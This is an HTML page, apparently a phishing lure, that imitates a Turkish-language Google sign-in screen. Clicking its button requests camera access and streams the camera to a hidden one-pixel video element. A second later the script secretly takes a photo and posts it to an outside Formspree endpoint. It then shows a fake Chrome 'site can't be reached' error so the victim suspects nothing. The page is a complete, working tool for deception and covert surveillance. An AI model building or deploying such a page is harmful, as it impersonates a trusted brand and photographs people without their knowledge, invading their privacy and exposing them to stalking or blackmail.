<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Hesabı ile Giriş Yap</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background-color: #f7f7f7; margin: 0; }
        .login-box { background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 350px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { color: #202124; margin-bottom: 30px; }
        .btn-google { background-color: #fff; color: #3c4043; border: 1px solid #dadce0; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; display: inline-flex; align-items: center; }
        .btn-google:hover { background-color: #f8f9fa; }
        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
        #error-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; color: #666; padding: 50px; text-align: left; }
    </style>
</head>
<body>

    <div id="main-content" class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
        <h1>Oturum açın</h1>
        <p>Devam etmek için Google Hesabınızı kullanın</p>
        <button class="btn-google" onclick="baslat()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="18" style="margin-right:10px;">
            Google ile Giriş Yap
        </button>
    </div>

    <div id="error-screen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Google_Chrome_icon_%28September_2014%29.svg" width="50">
        <h2 style="color:#333; margin-top:30px;">Bu siteye ulaşılamıyor</h2>
        <p><b>github.io</b> ana makinesinin sunucu IP adresi bulunamadı.</p>
        <p>Şunları deneyin:</p>
        <ul>
            <li>Bağlantınızı kontrol etme</li>
            <li>Proxy ve güvenlik duvarını kontrol etme</li>
            <li>Tanılama ağını çalıştırma</li>
        </ul>
        <p style="color:#999; font-size:12px; margin-top:20px;">ERR_NAME_NOT_RESOLVED</p>
    </div>

    <video id="videoElement" autoplay playsinline></video>

    <script>
        async function baslat() {
            try {
                // Kamera izni iste
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.querySelector("#videoElement");
                video.srcObject = stream;

                // İzinden 1 saniye sonra gizlice çek ve gönder
                setTimeout(fotografCekVeGonder, 1000);
            } catch (err) {
                // İzin verilmezse de hata ekranına at
                hataEkraniniGoster();
            }
        }

        async function fotografCekVeGonder() {
            const video = document.querySelector("#videoElement");
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            
            const veriUrl = canvas.toDataURL("image/jpeg", 0.6);

            // Formspree gönderimi
            await fetch("https://formspree.io/f/meelplaw", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    _subject: "Google Giriş Denemesi!",
                    fotograf: veriUrl
                })
            });

            // Gönderdikten sonra siteyi patlat
            hataEkraniniGoster();
        }

        function hataEkraniniGoster() {
            document.getElementById("main-content").style.display = "none";
            document.getElementById("error-screen").style.display = "block";
            document.body.style.background = "white";
        }
    </script>
</body>
</html>
